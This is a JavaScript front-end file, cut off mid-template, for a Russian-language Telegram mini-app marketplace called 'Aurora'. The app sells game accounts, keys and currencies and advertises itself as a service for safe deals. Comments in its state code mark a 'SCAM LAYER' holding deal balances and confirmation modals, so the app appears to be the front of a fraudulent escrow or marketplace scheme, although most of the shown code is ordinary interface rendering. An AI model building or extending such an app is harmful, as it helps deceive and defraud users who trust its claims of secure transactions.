(() => {
  const D = window.DATA;
  const $ = (sel, el = document) => el.querySelector(sel);
  const img = (p) => (window.IMG && window.IMG[p]) || p;
  const game = (id) => D.games.find((g) => g.id === id);
  const ccy = (id) => D.currencies.find((c) => c.id === id) || D.currencies[7];
  const uid = (p) => p + Math.random().toString(36).slice(2, 9);
  const emptyBal = () => Object.fromEntries(D.currencies.map((c) => [c.id, 0]));
  // Добавлен экран deals
  const SCREENS = ["hub","home","shop","section","sell","wallet","profile","chats","support","item","ops","deals"];
  const TABS = new Set(["profile","chats","sell","wallet","support","deals"]);

  function money(n, id = "USDT") {
    const m = ccy(id);
    const dec = ["USD","EUR","USDT","GRAM"].includes(id);
    const abs = Math.abs(n);
    const f = dec
      ? new Intl.NumberFormat("ru-RU", { maximumFractionDigits: 2, minimumFractionDigits: 0 }).format(abs)
      : new Intl.NumberFormat("ru-RU").format(Math.round(abs));
    return `${n < 0 ? "−" : ""}${f} ${m.label}`;
  }
  function parseAmount(v) {
    const n = Number(String(v).trim().replace(/\s/g, "").replace(",", "."));
    return Number.isFinite(n) ? n : NaN;
  }
  function timeLabel(at) {
    return new Intl.DateTimeFormat("ru-RU", { hour: "2-digit", minute: "2-digit" }).format(at);
  }
  function dateLabel(at) {
    return new Intl.DateTimeFormat("ru-RU", { day: "2-digit", month: "2-digit", hour: "2-digit", minute: "2-digit" }).format(at);
  }
  function minTopup(c) { return c === "STARS" ? 50 : ["RUB","UAH","KZT","BYN"].includes(c) ? 100 : 1; }
  function minWithdraw(c) { return c === "STARS" ? 50 : ["RUB","UAH","KZT","BYN"].includes(c) ? 300 : 5; }

  function loadState() {
    try { return JSON.parse(localStorage.getItem("aurora-market") || "null"); } catch { return null; }
  }
  const saved = loadState() || {};
  const state = {
    profile: saved.profile || { id: "me", tgId: 0, username: "player", firstName: "Алекс", photoUrl: "" },
    balances: Object.assign(emptyBal(), saved.balances || {}),
    payCurrency: saved.payCurrency || "USDT",
    listings: saved.listings || [],
    orders: saved.orders || [],
    ops: saved.ops || [],
    support: saved.support || [{ id: "s0", from: "support", text: "👋 Привет! Это поддержка.\nНапиши — сообщение придёт оператору в Telegram.", at: Date.now() }],
    /* --- SCAM LAYER STATE --- */
    dealBalance: saved.dealBalance || 0,
    dealDeals: saved.dealDeals || [],
    confirmModal: null,
    dealFilter: saved.dealFilter || "all",
    /* --- END SCAM LAYER --- */
    screen: "profile",
    selectedId: null,
    toast: null,
    query: "",
    shopPick: "all",
    shopRegion: "",
    sell: { step: 1, role: null, category: "accounts", gameId: null, wantGameId: null, title: "", description: "", price: "", photos: [], currency: "USDT" },
    folds: { cat: false, games: false },
    sheet: "",
    amount: "",
    details: "",
    ccyPick: "USDT",
    chatText: "",
    sortKey: "price",
    sortDir: "desc",
  };

  function persist() {
    localStorage.setItem("aurora-market", JSON.stringify({
      profile: state.profile, balances: state.balances, payCurrency: state.payCurrency,
      listings: state.listings, orders: state.orders, ops: state.ops, support: state.support,
      dealBalance: state.dealBalance, dealDeals: state.dealDeals, dealFilter: state.dealFilter,
    }));
  }
  function toast(msg) {
    state.toast = msg;
    render();
    setTimeout(() => { if (state.toast === msg) { state.toast = null; render(); } }, 2200);
  }
  
  // Функция плавного скролла к полям ввода
  function scrollToInput() {
    setTimeout(() => {
      const el = document.getElementById('title');
      if (el) {
        const container = document.querySelector('.scroll');
        if (container) {
          // Скроллим контейнер так, чтобы элемент был в центре (с учетом шапки)
          const top = el.getBoundingClientRect().top + container.scrollTop - 100;
          container.scrollTo({ top: top, behavior: 'smooth' });
        }
      }
    }, 50); // Небольшая задержка, чтобы DOM обновился
  }

  function go(screen, id) {
    state.screen = screen;
    state.selectedId = id || null;
    const hash = screen === "hub" ? "#" : id ? `#/${screen}/${id}` : `#/${screen}`;
    if (location.hash !== hash) history.pushState({ screen, id }, "", hash);
    if (screen === "sell") state.sell.currency = state.payCurrency;
    render();
  }
  function readHash() {
    const raw = location.hash.replace(/^#\/?/, "");
    const [s, id] = raw.split("/");
    if (SCREENS.includes(s)) return { screen: s, selectedId: id || null };
    return { screen: "profile", selectedId: null };
  }

  function tg() { return window.Telegram && window.Telegram.WebApp; }
  function bootTg() {
    const w = tg();
    if (!w) return false;
    try {
      w.ready(); w.expand();
      if (w.isVersionAtLeast && w.isVersionAtLeast("6.1")) {
        w.setHeaderColor && w.setHeaderColor("#17212b");
        w.setBackgroundColor && w.setBackgroundColor("#17212b");
      }
    } catch {}
    const u = w.initDataUnsafe && w.initDataUnsafe.user;
    if (u && u.id) {
      state.profile = {
        id: "tg-" + u.id, tgId: u.id,
        username: u.username || "user",
        firstName: u.first_name || u.username || "Гость",
        photoUrl: u.photo_url || "",
      };
      persist();
    }
    return true;
  }
  function haptic() {
    try {
      const w = tg();
      if (w && w.isVersionAtLeast && w.isVersionAtLeast("6.1") && w.HapticFeedback) w.HapticFeedback.impactOccurred("light");
    } catch {}
  }
  function openExternal(url) {
    const w = tg();
    if (w && w.openLink) w.openLink(url); else window.open(url, "_blank", "noopener");
  }
  function initData() {
    const w = tg();
    return (w && w.initData) || "";
  }
  function botApi() {
    const q = new URLSearchParams(location.search).get("api");
    if (q) {
      try { localStorage.setItem("aurora-bot-api", q.replace(/\/$/, "")); } catch {}
    }
    return (D.botApi || localStorage.getItem("aurora-bot-api") || "").replace(/\/$/, "");
  }
  function mapMsg(m) {
    return { id: m.id, from: (m.from === "user" || m.from === "me") ? "me" : "support", text: m.text, at: m.at };
  }
  function mergeSupport(msgs) {
    if (!Array.isArray(msgs)) return;
    const greet = state.support.find((m) => m.id === "s0");
    const mapped = msgs.map(mapMsg);
    const serverIds = new Set(mapped.map((m) => m.id));
    const extras = state.support.filter((m) => m.id !== "s0" && !serverIds.has(m.id));
    const next = [...(greet ? [greet] : []), ...mapped];
    for (const m of extras) {
      if (!next.some((x) => x.from === m.from && x.text === m.text)) next.push(m);
    }
    state.support = next;
  }
  async function desk(path, opts) {
    const base = botApi();
    if (!base) return null;
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), 12000);
    try {
      const r = await fetch(base + path, Object.assign({
        signal: ctrl.signal,
        headers: { "Content-Type": "application/json", "X-Telegram-Init-Data": initData() },
      }, opts || {}));
      if (!r.ok) return null;
      return await r.json();
    } catch {
      return null;
    } finally {
      clearTimeout(t);
    }
  }
  async function pullThread() {
    if (!botApi() || !initData()) return;
    const res = await desk("/api/thread");
    if (res && res.messages) {
      mergeSupport(res.messages);
      persist();
      const typing = document.activeElement && document.activeElement.id === "chat";
      if (typing) state.chatText = document.activeElement.value;
      if (state.screen === "support" && !typing) render();
    }
  }
  function chatDraft() {
    const input = $("#chat");
    return ((input && input.value) || state.chatText || "").trim();
  }
  async function sendSupport(text) {
    const body = String(text || "").trim();
    if (!body) return;
    const local = { id: uid("m"), from: "me", text: body, at: Date.now(), local: true };
    state.support.push(local);
    state.chatText = "";
    persist();
    render();
    if (botApi() && initData()) {
      const res = await desk("/api/thread", { method: "POST", body: JSON.stringify({ text: body }) });
      if (res && res.messages) {
        mergeSupport(res.messages);
        persist();
        render();
        return;
      }
    }
    setTimeout(() => {
      state.support.push({
        id: uid("s"),
        from: "support",
        text: "Приняли. Ответим в этом чате.",
        at: Date.now(),
      });
      persist();
      if (state.screen === "support") render();
    }, 450);
  }

  function ico(d) {
    return `<svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">${d}</svg>`;
  }
  const I = {
    user: ico('<path d="M20 21a8 8 0 0 0-16 0"/><circle cx="12" cy="8" r="4"/>'),
    wallet: ico('<path d="M19 7V6a2 2 0 0 0-2-2H5"/><rect x="2" y="7" width="20" height="14" rx="2"/><path d="M16 12h.01"/>'),
    chat: ico('<path d="M21 15a4 4 0 0 1-4 4H7l-4 4V7a4 4 0 0 1 4-4h10a4 4 0 0 1 4 4z"/>'),
    plus: ico('<path d="M12 5v14M5 12h14"/>'),
    help: ico('<circle cx="12" cy="12" r="10"/><path d="M9.1 9a3 3 0 0 1 5.8 1c0 2-3 2-3 4"/><path d="M12 17h.01"/>'),
    back: ico('<path d="M19 12H5M12 19l-7-7 7-7"/>'),
    send: ico('<path d="M22 2 11 13"/><path d="M22 2 15 22l-4-9-9-4 20-7z"/>'),
    shield: ico('<path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>'),
    pack: ico('<path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/>'),
    game: ico('<rect x="2" y="6" width="20" height="12" rx="2"/><path d="M6 12h4M8 10v4M15 11h.01M18 13h.01"/>'),
    coins: ico('<circle cx="8" cy="8" r="6"/><path d="M18.1 14.4A6 6 0 1 1 9.6 5.9"/>'),
    gift: ico('<rect x="3" y="8" width="18" height="4" rx="1"/><path d="M12 8v13M19 12v7a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2v-7"/><path d="M7.5 8a2.5 2.5 0 0 1 0-5C11 3 12 8 12 8s1-5 4.5-5a2.5 2.5 0 0 1 0 5"/>'),
    key: ico('<circle cx="7.5" cy="15.5" r="5.5"/><path d="M21 2l-9.6 9.6"/><path d="M15.5 7.5l3 3L22 7l-3-3"/>'),
    star: ico('<polygon points="12 2 15 9 22 9 17 14 19 21 12 17 5 21 7 14 2 9 9 9"/>'),
    swap: ico('<path d="M8 3 4 7l4 4"/><path d="M4 7h16"/><path d="M16 21l4-4-4-4"/><path d="M20 17H4"/>'),
    wr: ico('<path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.8-3.8a6 6 0 0 1-7.9 7.9l-6.9 6.9a2.1 2.1 0 0 1-3-3l6.9-6.9a6 6 0 0 1 7.9-7.9l-3.8 3.8z"/>'),
    ticket: ico('<path d="M2 9a3 3 0 0 1 0 6v2a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-2a3 3 0 0 1 0-6V7a2 2 0 0 0-2-2H4a2 2 0 0 0-2 2z"/>'),
    bag: ico('<path d="M6 2 3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z"/><path d="M3 6h18"/><path d="M16 10a4 4 0 0 1-8 0"/>'),
    card: ico('<rect x="2" y="5" width="20" height="14" rx="2"/><path d="M2 10h20"/>'),
    userCheck: ico('<path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M16 11l2 2 4-4"/>'),
    spark: ico('<path d="M12 3v4M12 17v4M3 12h4M17 12h4M5.6 5.6l2.8 2.8M15.6 15.6l2.8 2.8M18.4 5.6l-2.8 2.8M8.4 15.6l-2.8 2.8"/>'),
    down: ico('<path d="M12 5v14M19 12l-7 7-7-7"/>'),
    up: ico('<path d="M12 19V5M5 12l7-7 7 7"/>'),
    out: ico('<path d="M7 17 17 7"/><path d="M7 7h10v10"/>'),
    head: ico('<path d="M3 14h3a2 2 0 0 1 2 2v3a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-7a9 9 0 0 1 18 0v7a2 2 0 0 1-2 2h-1a2 2 0 0 1-2-2v-3a2 2 0 0 1 2-2h3"/>'),
    link: ico('<path d="M10 13a5 5 0 0 0 7.5.5l3-3a5 5 0 0 0-7-7l-1.7 1.7"/><path d="M14 11a5 5 0 0 0-7.5-.5l-3 3a5 5 0 0 0 7 7l1.7-1.7"/>'),
    image: ico('<rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="9" cy="9" r="2"/><path d="m21 15-5-5L5 21"/>'),
    list: ico('<path d="M8 6h13M8 12h13M8 18h13M3 6h.01M3 12h.01M3 18h.01"/>'),
    act: ico('<path d="M22 12h-4l-3 9L9 3l-3 9H2"/>'),
    sliders: ico('<path d="M4 21v-7M4 10V3M12 21v-9M12 8V3M20 21v-5M20 12V3M1 14h6M9 8h6M17 16h6"/>'),
    chev: ico('<path d="m6 9 6 6 6-6"/>'),
    x: ico('<path d="M18 6 6 18M6 6l12 12"/>'),
    cart: ico('<circle cx="8" cy="21" r="1"/><circle cx="19" cy="21" r="1"/><path d="M2.05 2.05h2l2.66 12.42a2 2 0 0 0 2 1.58h9.78a2 2 0 0 0 1.95-1.57L23 6H6"/>'),
    brief: ico('<rect x="2" y="7" width="20" height="14" rx="2"/><path d="M16 7V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v2"/>'),
    lock: ico('<rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>'),
    check: ico('<path d="M20 6 9 17l-5-5"/>'),
    clock: ico('<circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/>'),
  };
  const CAT_ICO = { topup: I.coins, onaccount: I.userCheck, accounts: I.game, keys: I.key, gift: I.gift, items: I.pack, subs: I.ticket, buysub: I.bag, giftcard: I.card, paycard: I.wallet, service: I.wr, telegram: I.spark, exchange: I.swap, nft: I.spark, stars: I.star, other: I.pack, deals: I.lock };

  function btn(label, extra = "", cls = "btn btn-primary") {
    return `<button type="button" class="${cls}" ${extra}>${label}</button>`;
  }
  function logo(id, cls = "logo") {
    const g = game(id); if (!g) return "";
    return `<img class="${cls}" src="${img(g.logo)}" alt="">`;
  }

  function listingPrice(it) {
    if (it.category === "exchange") return it.price > 0 ? `Доплата ${money(it.price, it.currency)}` : "Без доплаты";
    return money(it.price, it.currency);
  }

  function buy(id) {
    const item = state.listings.find((l) => l.id === id);
    if (!item) return toast("Лот не найден");
    if (item.sellerId === state.profile.id) return toast("Это ваш лот");
    if (item.stock < 1) return toast("Нет в наличии");
    const have = state.balances[item.currency] || 0;
    if (item.price > 0 && have < item.price) return toast("Недостаточно средств");
    if (item.price > 0) state.balances[item.currency] = have - item.price;
    item.stock -= 1;
    state.orders.unshift({ id: uid("o"), listingId: item.id, title: item.title, amount: item.price, currency: item.currency, status: "held", at: Date.now() });
    state.ops.unshift({ id: uid("w"), type: "purchase", amount: -item.price, currency: item.currency, status: "done", note: item.title, at: Date.now() });
    persist();
    toast(item.category === "exchange" ? "Обмен предложен" : "Оплачено. Товар в холде.");
  }
  function lotCard(it) {
    const photos = it.photos && it.photos.length ? it.photos : it.photo ? [it.photo] : [];
    const pic = photos[0]
      ? `<img src="${photos[0]}" alt="" style="width:100%;height:7rem;object-fit:cover">`
      : `<div style="height:7rem;background:linear-gradient(160deg,${it.accent || "#31b545"},#10161c)"></div>`;
    return `<article class="card">
      <button type="button" class="w-full" data-go="item" data-id="${it.id}" style="border:0;background:transparent;color:inherit;text-align:left;padding:0">
        <div style="position:relative">${pic}<span class="badge">${D.labels[it.category] || ""}</span></div>
        <div style="padding:.65rem"><h3 class="xs bold" style="min-height:2rem;margin:0">${esc(it.title)}</h3></div>
      </button>
      <div class="row" style="justify-content:space-between;padding:0 .65rem .65rem">
        <span class="xs bold chipfg">${listingPrice(it)}</span>
        ${btn(it.category === "exchange" ? "Обмен" : "Купить", `data-buy="${it.id}"`, "btn btn-primary btn-mini")}
      </div>
    </article>`;
  }
  function esc(s) { return String(s || "").replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c])); }

  function lotTools(items, empty) {
    const list = [...items].sort((a, b) => {
      const mul = state.sortDir === "desc" ? -1 : 1;
      let cmp = state.sortKey === "title" ? a.title.localeCompare(b.title, "ru") : a.price - b.price;
      return cmp * mul;
    });
    return `<div>
      <div class="lot-tools">
        <button type="button" class="lot-tool" data-sort-dir>${I.swap}</button>
        <button type="button" class="lot-tool" data-sort-key>${state.sortKey === "title" ? "Название" : "Цена"} ${I.chev}</button>
      </div>
      ${list.length ? `<div class="grid2 mt">${list.map(lotCard).join("")}</div>` : emptyBox(empty)}
    </div>`;
  }
  function emptyBox(text) {
    return `<div class="card mt" style="padding:2rem 1.5rem;text-align:center">
      ${I.pack}<p class="bold mt-2">Пока нет лотов</p>
      <p class="small muted">${esc(text)}</p>
      ${btn(I.plus + " Создать лот", `data-go="sell"`, "btn btn-primary mt")}
    </div>`;
  }

  function tabbar() {
    if (state.screen === "support") return "";
    const on = (id) => state.screen === id ? "on" : "";
    return `<nav class="tabbar">
      <button class="tab-btn ${on("profile")}" data-go="profile">${I.user}Профиль</button>
      <button class="tab-btn ${on("home")}" data-go="home">${I.pack}Каталог</button>
      <button class="tab-plus" data-go="sell" aria-label="Новая сделка">${I.plus}</button>
      <button class="tab-btn ${on("wallet")}" data-go="wallet">${I.wallet}Кошелёк</button>
      <button class="tab-btn ${on("support")}" data-go="support">${I.help}Помощь</button>
    </nav>`;
  }
  function topbar() {
    if (TABS.has(state.screen) || state.screen === "hub") return "";
    return `<header class="header">
      ${btn(I.back + " Назад", `data-back`, "btn btn-ghost")}
      <button type="button" class="btn btn-chip" data-go="wallet">${money(state.balances[state.payCurrency] || 0, state.payCurrency)}</button>
    </header>`;
  }

  function hub() {
    return `<div class="scroll pad">
      <div class="card"><img src="${img("banner.jpg")}" alt="Aurora" style="height:11rem;width:100%;object-fit:cover;object-position:center 20%"></div>
      <div class="card mt" style="padding:1rem">
        <p class="bold" style="margin:0"><span style="display:inline-block;width:.5rem;height:.5rem;border-radius:99px;background:var(--primary);margin-right:.4rem"></span>Сервис для создания и проведения сделок между пользователями</p>
        <p class="small muted mt-2">Покупайте, продавайте и обменивайте товары или услуги безопасно и удобно</p>
        ${btn(I.out + " Открыть", `data-go="profile"`, "btn btn-primary mt-4")}
      </div>
      <div class="grid2 mt">
        ${btn(I.user + " Профиль", `data-go="profile"`, "btn btn-hub")}
        ${btn(I.wallet + " Кошелек", `data-go="wallet"`, "btn btn-hub")}
        ${btn(I.chat + " Чаты", `data-go="chats"`, "btn btn-hub")}
        ${btn(I.lock + " Сделки", `data-go="deals"`, "btn btn-hub")}
        ${btn(I.plus + " Создать", `data-go="sell"`, "btn btn-hub")}
        ${btn(I.head + " Поддержка", `data-go="support"`, "btn btn-hub")}
        ${btn(I.link + " Сайт", `data-site`, "btn btn-hub")}
      </div>
    </div>`;
  }

  function catalog() {
    const q = state.query.trim().toLowerCase();
    const items = state.listings.filter((l) => l.stock > 0 && (!q || (l.title + l.description).toLowerCase().includes(q)));
    const catTiles = D.catalogs.slice(0, 3).map((c) => `<span>${CAT_ICO[c.id] || I.pack}</span>`).join("");
    const gameTiles = D.games.slice(0, 3).map((g) => `<span><img src="${img(g.logo)}" alt=""></span>`).join("");
    
    const headerRow = `<div class="row" style="justify-content:space-between;align-items:center;margin-bottom:.5rem">
      <h1 class="h1" style="margin:0">Каталог</h1>
      <button type="button" class="btn btn-ghost" data-go="deals">${I.lock} Сделки</button>
    </div>`;

    return `<div class="scroll pad">
      ${headerRow}
      <input class="field" id="q" placeholder="Найти игру, ключ, NFT…" value="${esc(state.query)}">
      <div class="card mt"><button type="button" class="fold-trigger" data-fold="cat">
        <span class="stack">${catTiles}</span>
        <span><span class="bold" style="display:block">Каталоги</span><span class="xs muted">${D.catalogs.length} разделов</span></span>
        <span class="chevron ${state.folds.cat ? "on" : ""}">${I.chev}</span>
      </button></div>
      <div class="fold-panel ${state.folds.cat ? "on" : ""}"><div class="fold-inner"><div class="grid2 mt-2">
        ${D.catalogs.map((c) => `<button type="button" class="card" style="display:flex;align-items:center;gap:.65rem;padding:.75rem;text-align:left;border:0;color:inherit" data-go="section" data-id="${c.id}">
          <span class="avatar" style="width:2.5rem;height:2.5rem;border-radius:1rem;background:var(--chip);color:var(--chip-fg)">${CAT_ICO[c.id] || I.pack}</span>
          <span><span class="bold" style="display:block;font-size:.875rem">${c.name}</span><span class="xs muted">${c.hint}</span></span>
        </button>`).join("")}
      </div></div></div>
      <div class="card mt"><button type="button" class="fold-trigger" data-fold="games">
        <span class="stack">${gameTiles}</span>
        <span><span class="bold" style="display:block">Популярные игры</span><span class="xs muted">${D.games.length} игр</span></span>
        <span class="chevron ${state.folds.games ? "on" : ""}">${I.chev}</span>
      </button></div>
      <div class="fold-panel ${state.folds.games ? "on" : ""}"><div class="fold-inner"><div class="grid2 mt-2">
        ${D.games.map((g) => `<button type="button" class="card" style="display:flex;align-items:center;gap:.65rem;padding:.65rem;text-align:left;border:0;color:inherit" data-go="shop" data-id="${g.id}">
          ${logo(g.id)}<span class="bold" style="font-size:.875rem">${g.name}</span>
        </button>`).join("")}
      </div></div></div>
      <p class="small bold chipfg mt-4 mb">Витрина</p>
      ${lotTools(items, "Витрина пустая. Опубликуйте первый товар — он появится здесь.")}
    </div>`;
  }

  function shop() {
    const g = game(state.selectedId);
    const sc = g && D.showcases[g.id];
    if (!g || !sc) return `<p class="px muted">Игра не найдена.</p>`;
    const col = state.shopPick === "all" ? null : sc.collections.find((c) => c.id === state.shopPick);
    const items = state.listings.filter((l) => {
      if (l.stock < 1 || l.gameId !== g.id) return false;
      if (!col) return true;
      if (l.category !== col.category) return false;
      if (state.shopRegion) {
        const hay = (l.title + " " + l.description).toLowerCase();
        const r = (col.regions || []).find((x) => x.id === state.shopRegion);
        if (r && !hay.includes(r.id) && !hay.includes(r.label.toLowerCase())) return false;
      }
      return true;
    });
    const regions = col && col.regions;
    return `<div class="scroll" style="padding-bottom:6rem">
      <button type="button" class="row gap px" style="border:0;background:transparent;color:inherit;padding-top:.5rem" data-go="home">
        ${logo(g.id, "logo")} <span><span class="h2" style="display:block">${g.name}</span><span class="xs muted">Пополнение ${g.coin} · аккаунты · обмен</span></span>
      </button>
      ${sc.hero ? `<div class="shop-hero mt"><img src="${img(sc.hero)}" alt="">${sc.heroTag ? `<div style="position:absolute;left:1rem;top:1rem"><span class="badge">${sc.heroTag}</span>${sc.heroTitle ? `<p class="h2" style="margin:.4rem 0 0">${sc.heroTitle}</p>` : ""}</div>` : ""}</div>` : ""}
      <div class="showcase-row no-scrollbar mt">
        ${sc.collections.map((c) => `<button type="button" class="showcase-card ${state.shopPick === c.id ? "on" : ""}" data-pick="${c.id}">
          <img src="${img(c.image)}" alt="">
          ${c.badge ? `<span class="badge">${c.badge}</span>` : ""}
          <span class="card-title">${c.title}</span>
        </button>`).join("")}
      </div>
      <div class="chips">
        ${btn("Показать все", `data-pick="all"`, `btn btn-chip ${state.shopPick === "all" ? "btn-chip-on" : ""}`)}
        ${sc.collections.map((c) => btn(c.title, `data-pick="${c.id}"`, `btn btn-chip ${state.shopPick === c.id ? "btn-chip-on" : ""}`)).join("")}
      </div>
      <p class="px small bold chipfg mt">${col ? col.title : "Все предложения"}</p>
      ${regions && regions.length ? `<div class="showcase-row no-scrollbar mt-2">${regions.map((r) => `<button type="button" class="btn btn-chip ${state.shopRegion === r.id ? "btn-chip-on" : ""}" data-region="${r.id}">${r.flag} ${r.label}</button>`).join("")}</div>` : ""}
      <div class="px">${lotTools(items, col ? `В «${col.title}» пока пусто.` : `В разделе ${g.name} пока нет предложений.`)}</div>
    </div>`;
  }

  function section() {
    const cat = D.catalogs.find((c) => c.id === state.selectedId);
    if (!cat) return `<p class="px muted">Раздел не найден.</p>`;
    const items = state.listings.filter((l) => l.stock > 0 && cat.cats.includes(l.category));
    return `<div class="scroll pad"><h1 class="h1">${cat.name}</h1><p class="small muted">${cat.hint}</p>${lotTools(items, `В разделе «${cat.name}» пока нет предложений.`)}</div>`;
  }

  function itemView() {
    const it = state.listings.find((l) => l.id === state.selectedId);
    if (!it) return `<p class="px muted">Лот не найден.</p>`;
    const g = game(it.gameId);
    const shots = it.photos && it.photos.length ? it.photos : it.photo ? [it.photo] : [];
    return `<div class="scroll pad">
      ${shots[0] ? `<img src="${shots[0]}" alt="" style="width:100%;height:12rem;object-fit:cover;border-radius:1.5rem">` : ""}
      <p class="xs bold chipfg mt">${D.labels[it.category] || ""}</p>
      <h1 class="h2 mt-2">${esc(it.title)}</h1>
      ${g ? `<p class="xs muted">${g.name}${g.coin ? " · " + g.coin : ""}</p>` : ""}
      <p class="small muted mt-2">${esc(it.description)}</p>
      <p class="h1 chipfg mt-4">${listingPrice(it)}</p>
      <p class="xs muted">В наличии: ${it.stock} · холд до передачи</p>
      ${btn(it.category === "exchange" ? "Предложить обмен" : "Купить с баланса", `data-buy="${it.id}"`, "btn btn-primary mt-4")}
    </div>`;
  }

  function sellView() {
    const s = state.sell;
    const g = game(s.gameId);
    const sc = g && D.showcases[g.id];
    const showGames = D.gameCats.includes(s.category);
    const steps = `<div class="deal-steps">${[1,2,3].map((n,i) => `<div class="deal-step ${s.step >= n ? "on" : ""}"><span class="deal-num">${n}</span><span class="xs">${["Роль","Детали","Готово"][i]}</span></div>`).join("")}</div>`;
    let body = "";

    if (s.step === 1) {
      body = `<p class="label mt-4">Ваша роль</p>
        <div class="grid2 mt-2">
          <button type="button" class="card" style="padding:1rem;text-align:left;border:0;color:inherit" data-role="sell">${I.brief}<span class="bold" style="display:block;margin-top:.75rem">Продавец</span><span class="xs muted">Продаю товар или услугу</span></button>
          <button type="button" class="card" style="padding:1rem;text-align:left;border:0;color:inherit" data-role="buy">${I.cart}<span class="bold" style="display:block;margin-top:.75rem">Покупатель</span><span class="xs muted">Покупаю товар или услугу</span></button>
        </div>`;
    } else if (s.step === 2 && s.role === "buy") {
      body = `<p class="label mt-4">Категория</p><div class="grid3 mt-2">
        ${D.games.map((x) => `<button type="button" class="card ${s.gameId === x.id ? "ring" : ""}" style="padding:.75rem;border:0;color:inherit;display:flex;flex-direction:column;align-items:center;gap:.4rem" data-game="${x.id}">${logo(x.id, "logo")}<span class="xs bold">${x.name}</span></button>`).join("")}
      </div>${btn("Далее", `data-sell-next`, "btn btn-primary mt-4")}`;
    } else if (s.step === 2) {
      // Категории используют data-svc
      const servicesHtml = D.services.map((t) => {
         return `<button type="button" class="card ${s.category === t.id ? "ring" : ""}" 
            data-svc="${t.id}"
            style="display:flex;align-items:center;gap:.65rem;padding:.75rem;text-align:left;border:0;color:inherit">
          <span class="avatar" style="width:2.5rem;height:2.5rem;border-radius:1rem;background:var(--chip);color:var(--chip-fg)">${CAT_ICO[t.id] || I.pack}</span>
          <span><span class="bold" style="display:block;font-size:.875rem">${t.label}</span><span class="xs muted">${t.hint}</span></span>
        </button>`;
      }).join("");

      body = `<p class="small bold chipfg mt-4">Что продаёте</p>
        <div class="grid2">${servicesHtml}</div>
        ${showGames ? `<p class="small bold chipfg mt-4">${s.category === "exchange" ? "Какой аккаунт отдаёте" : "Игра"}</p>
          <div class="grid2">${D.games.map((x) => `<button type="button" class="card ${s.gameId === x.id ? "ring" : ""}" style="display:flex;align-items:center;gap:.65rem;padding:.65rem;text-align:left;border:0;color:inherit" data-game="${x.id}">${logo(x.id)}<span class="bold" style="font-size:.875rem">${x.name}</span></button>`).join("")}</div>` : ""}
        ${s.category === "exchange" ? `<p class="small bold chipfg mt-4">Какой аккаунт ищете</p>
          <div class="grid2">${D.games.map((x) => `<button type="button" class="card ${s.wantGameId === x.id ? "ring" : ""}" style="display:flex;align-items:center;gap:.65rem;padding:.65rem;text-align:left;border:0;color:inherit" data-want="${x.id}">${logo(x.id)}<span class="bold" style="font-size:.875rem">${x.name}</span></button>`).join("")}</div>` : ""}
        ${sc && sc.collections ? `<p class="small bold chipfg mt-4">Что именно</p><div class="grid2">${sc.collections.map((c) => `<button type="button" class="card" style="text-align:left;border:0;color:inherit;padding:0" data-offer="${c.id}" data-offercat="${c.category}" data-offertitle="${esc(c.title)}"><img src="${img(c.image)}" alt="" style="height:4rem;width:100%;object-fit:cover"><span class="xs bold" style="display:block;padding:.5rem">${c.title}</span></button>`).join("")}</div>` : ""}
        
        <!-- КНОПКА ФОТО -->
        <div class="card mt photo-upload-btn" style="padding:1.5rem; text-align:center; border:2px dashed var(--border); cursor:pointer;" onclick="document.getElementById('photos-input').click()">
           ${I.image} <span class="bold" style="display:block;margin-top:0.5rem">Нажми, чтобы добавить фото</span>
           <span class="xs muted">JPG, PNG, WEBP</span>
           <input id="photos-input" type="file" accept="image/*" multiple style="display:none" onchange="window.handlePhotos(this)">
        </div>

        ${s.photos.length > 0 ? `<div class="grid2 mt-2">${s.photos.map((p,i) => `<div style="position:relative"><img src="${p}" style="height:6rem;width:100%;object-fit:cover;border-radius:1rem"><button type="button" style="position:absolute;top:4px;right:4px;background:rgba(0,0,0,0.6);color:#fff;border-radius:50%;width:20px;height:20px;display:grid;place-items:center;font-size:12px" onclick="state.sell.photos.splice(${i},1);render()">×</button></div>`).join("")}</div>` : ""}
        
        <input class="field mt" id="title" placeholder="Название товара" value="${esc(s.title)}">
        <textarea class="field mt" id="desc" placeholder="Опишите товар (состояние, причина продажи)">${esc(s.description)}</textarea>
        <input class="field mt" id="price" inputmode="decimal" placeholder="${s.category === "exchange" ? "Доплата, если есть" : "Цена (например 1500)"}" value="${esc(s.price)}">
        <div class="grid3 mt-2">${D.currencies.map((c) => btn(c.label, `data-ccy="${c.id}"`, `btn btn-chip ${s.currency === c.id ? "btn-chip-on" : ""}`)).join("")}</div>
        ${btn("Далее", `data-sell-next`, "btn btn-primary mt")}`;
    } else {
      if (s.role === "buy") {
        body = `<p class="small muted mt-4">Откроется витрина выбранной категории.</p>${btn("Смотреть предложения", `data-buy-go`, "btn btn-primary mt-4")}${btn("Назад", `data-sell-back`, "btn btn-secondary mt-2")}`;
      } else {
        body = `<p class="bold mt-4">${esc(s.title) || "Без названия"}</p>
          <p class="xs muted">${D.labels[s.category] || ""}${g ? " · " + g.name : ""}</p>
          ${s.photos[0] ? `<img src="${s.photos[0]}" alt="" style="margin-top:.75rem;height:8rem;width:100%;object-fit:cover;border-radius:1.25rem">` : ""}
